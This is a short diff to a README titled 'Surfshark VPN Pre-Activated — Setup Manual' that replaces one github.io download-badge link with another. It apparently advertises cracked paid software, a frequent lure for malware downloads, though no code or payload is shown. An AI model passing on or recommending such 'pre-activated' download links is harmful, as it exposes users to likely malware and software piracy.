@@ -1,7 +1,7 @@
 # 🛡️ Surfshark VPN Pre-Activated — Setup Manual
 
 ⬇️ **Download Tool**  
-[![Download](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://surfsharkvpn-pre-activated.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://siregarzulkifli53-gmail-com-mail-friend.github.io/.github/)
 
 ---
 
